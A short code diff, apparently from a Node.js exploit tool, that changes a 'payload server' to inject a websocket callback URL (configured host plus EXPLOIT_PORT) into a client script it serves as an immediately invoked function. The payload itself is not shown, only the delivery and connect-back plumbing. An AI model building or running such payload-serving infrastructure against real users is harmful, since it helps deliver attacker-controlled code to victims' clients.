@@ -97,7 +97,11 @@ function main() {
 
     const CLIENT_PORT = config.client_port || 8080
     http.createServer((req, res) => {
-        res.end('(' + client + ')()')
+        const HOST = config.host || 'localhost'
+        const server_url = '"ws://' + HOST + ':' + EXPLOIT_PORT + '"'
+        let client_payload = '(' + client + ')()'
+        client_payload = client_payload.replace('$$SERVER_URL$$', server_url)
+        res.end(client_payload)
     }).listen(CLIENT_PORT)
     console.log('Payload server running on port ' + CLIENT_PORT)
 
